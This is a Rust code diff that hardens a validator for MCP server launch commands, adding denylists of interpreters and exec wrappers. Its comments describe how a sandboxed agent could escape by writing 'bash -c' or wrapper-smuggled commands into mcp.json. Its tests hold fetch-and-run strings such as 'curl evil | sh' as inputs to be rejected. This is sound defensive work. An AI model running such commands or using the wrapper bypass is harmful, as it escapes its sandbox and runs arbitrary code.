@@ -15,6 +15,19 @@ const INLINE_CODE_INTERPRETERS: &[&str] = &[
     "sh", "bash", "zsh", "dash", "ksh", "fish", "ash", "python", "python2",
     "python3", "node", "nodejs", "deno", "bun", "ruby", "perl", "php",
     "osascript", "rscript",
+    // awk/gawk evaluate their program argument directly (`BEGIN{system("…")}`),
+    // reaching the same arbitrary-exec without a conventional `-c`/`-e` flag.
+    "awk", "gawk", "mawk",
+];
+
+/// Exec wrappers that run `argv[1..]` as a fresh command. A wrapper defeats a
+/// basename-only interpreter check (`env bash -c …`, `xargs bash -c …`), so if
+/// `command` is one of these we look PAST it for a nested interpreter (security
+/// audit 2026-07-05 MEDIUM). Kept separate from the interpreter list because a
+/// wrapper is only dangerous in combination with an interpreter in its args.
+const EXEC_WRAPPERS: &[&str] = &[
+    "env", "xargs", "nohup", "timeout", "setsid", "stdbuf", "nice", "ionice",
+    "script", "busybox", "time", "doas", "sudo", "chroot", "unbuffer",
 ];
 
 /// True if `arg` makes an interpreter evaluate the NEXT argument as code rather
@@ -26,27 +39,70 @@ fn is_inline_code_flag(arg: &str) -> bool {
         || a.eq_ignore_ascii_case("/c")
 }
 
-/// Reject MCP server launch commands that execute inline code from a string
-/// argument (security audit HIGH #1/#2). MCP stdio servers spawn from
-/// `command`/`args` taken verbatim from `mcp.json` — and `~/.notesage/mcp.json`
-/// is writable by sandboxed agents, so `command:"bash", args:["-c","…"]` is a
-/// sandbox-escape primitive. Legitimate servers invoke a launcher (`npx`,
-/// `uvx`, `node server.js`, `python -m pkg`) which never pairs an interpreter
-/// with an inline-eval flag, so this guard is surgical.
-pub fn validate_mcp_command(command: &str, args: &[String]) -> Result<(), String> {
-    let raw = std::path::Path::new(command)
+/// Normalize a command/arg token to its lowercase basename without `.exe`, so
+/// `/opt/homebrew/bin/python3` and `NODE.EXE` match the denylists.
+fn basename_of(token: &str) -> String {
+    let raw = std::path::Path::new(token)
         .file_name()
         .and_then(|s| s.to_str())
-        .unwrap_or(command)
+        .unwrap_or(token)
         .to_lowercase();
-    let basename = raw.strip_suffix(".exe").unwrap_or(&raw);
+    raw.strip_suffix(".exe").unwrap_or(&raw).to_string()
+}
 
-    if INLINE_CODE_INTERPRETERS.contains(&basename)
-        && args.iter().any(|a| is_inline_code_flag(a))
-    {
+/// True if the token sequence contains an inline-code interpreter paired with an
+/// inline-eval flag anywhere after it. `awk`/`gawk`/`mawk` are treated as
+/// self-evaluating: any non-flag program argument counts (they have no `-c`).
+fn has_inline_code_invocation(tokens: &[String]) -> Option<String> {
+    for (i, tok) in tokens.iter().enumerate() {
+        let base = basename_of(tok);
+        if !INLINE_CODE_INTERPRETERS.contains(&base.as_str()) {
+            continue;
+        }
+        let rest = &tokens[i + 1..];
+        let self_evaluating = matches!(base.as_str(), "awk" | "gawk" | "mawk");
+        let inline = if self_evaluating {
+            // awk PROGRAM: the first non-flag token is code.
+            rest.iter().any(|a| !a.starts_with('-'))
+        } else {
+            rest.iter().any(|a| is_inline_code_flag(a))
+        };
+        if inline {
+            return Some(base);
+        }
+    }
+    None
+}
+
+/// Reject MCP server launch commands that execute inline code from a string
+/// argument (security audit HIGH #1/#2, hardened 2026-07-05 MEDIUM). MCP stdio
+/// servers spawn from `command`/`args` taken verbatim from `mcp.json` — and
+/// `~/.notesage/mcp.json` is writable by sandboxed agents, so
+/// `command:"bash", args:["-c","…"]` is a sandbox-escape primitive. The guard
+/// also looks through exec wrappers (`env`/`xargs`/`nohup`/… bash -c …) so a
+/// wrapper binary can't smuggle the same payload past a basename-only check.
+/// Legitimate servers invoke a launcher (`npx`, `uvx`, `node server.js`,
+/// `python -m pkg`) which never pairs an interpreter with an inline-eval flag,
+/// so this guard stays surgical.
+pub fn validate_mcp_command(command: &str, args: &[String]) -> Result<(), String> {
+    let basename = basename_of(command);
+
+    // Build the token stream the guard scans. When `command` is an exec
+    // wrapper, the real program is somewhere in `args`, so scan args for a
+    // nested interpreter. Otherwise scan `[command, ...args]` directly.
+    let flagged = if EXEC_WRAPPERS.contains(&basename.as_str()) {
+        has_inline_code_invocation(args)
+    } else {
+        let mut all = Vec::with_capacity(args.len() + 1);
+        all.push(command.to_string());
+        all.extend_from_slice(args);
+        has_inline_code_invocation(&all)
+    };
+
+    if let Some(interpreter) = flagged {
         return Err(format!(
             "Refusing to launch MCP server: '{}' with an inline-code flag (e.g. -c/-e/--eval) runs arbitrary commands. Point the server at a script file or a launcher (npx/uvx) instead.",
-            basename
+            interpreter
         ));
     }
     Ok(())
@@ -142,6 +198,42 @@ mod tests {
         assert!(validate_mcp_command("perl", &["-e".into(), "x".into()]).is_err());
         assert!(validate_mcp_command("ruby", &["-e".into(), "x".into()]).is_err());
         assert!(validate_mcp_command("osascript", &["-e".into(), "x".into()]).is_err());
+    }
+
+    // --- wrapper-binary bypass (security audit 2026-07-05 MEDIUM) ---
+
+    #[test]
+    fn rejects_exec_wrappers_smuggling_an_interpreter() {
+        // The canonical bypass: a wrapper binary runs bash -c past a
+        // basename-only check.
+        assert!(validate_mcp_command("env", &["bash".into(), "-c".into(), "curl evil | sh".into()]).is_err());
+        assert!(validate_mcp_command("/usr/bin/xargs", &["-I".into(), "{}".into(), "bash".into(), "-c".into(), "x".into()]).is_err());
+        assert!(validate_mcp_command("nohup", &["python3".into(), "-c".into(), "import os".into()]).is_err());
+        assert!(validate_mcp_command("timeout", &["10".into(), "sh".into(), "-c".into(), "x".into()]).is_err());
+        assert!(validate_mcp_command("setsid", &["node".into(), "-e".into(), "x".into()]).is_err());
+        assert!(validate_mcp_command("nice", &["-n".into(), "10".into(), "perl".into(), "-e".into(), "x".into()]).is_err());
+        // Wrapper with env-var assignments before the interpreter.
+        assert!(validate_mcp_command("env", &["FOO=bar".into(), "zsh".into(), "-c".into(), "x".into()]).is_err());
+    }
+
+    #[test]
+    fn rejects_awk_self_evaluating_program() {
+        // awk/gawk have no -c: the program argument itself is code.
+        assert!(validate_mcp_command("awk", &["BEGIN{system(\"curl evil|sh\")}".into()]).is_err());
+        assert!(validate_mcp_command("gawk", &["BEGIN{system(\"x\")}".into()]).is_err());
+        // Also via a wrapper.
+        assert!(validate_mcp_command("env", &["awk".into(), "BEGIN{system(\"x\")}".into()]).is_err());
+    }
+
+    #[test]
+    fn allows_wrappers_without_an_interpreter() {
+        // A wrapper around a plain server binary is fine — no nested interpreter.
+        assert!(validate_mcp_command("env", &["FOO=bar".into(), "mcp-server-git".into()]).is_ok());
+        assert!(validate_mcp_command("nohup", &["my-server".into(), "--port".into(), "9000".into()]).is_ok());
+        assert!(validate_mcp_command("timeout", &["30".into(), "uvx".into(), "mcp-server-git".into()]).is_ok());
+        // Wrapper running an interpreter against a FILE (no inline-eval flag).
+        assert!(validate_mcp_command("env", &["node".into(), "/abs/server.js".into()]).is_ok());
+        assert!(validate_mcp_command("nohup", &["python3".into(), "-m".into(), "my_mcp".into()]).is_ok());
     }
 
     #[test]
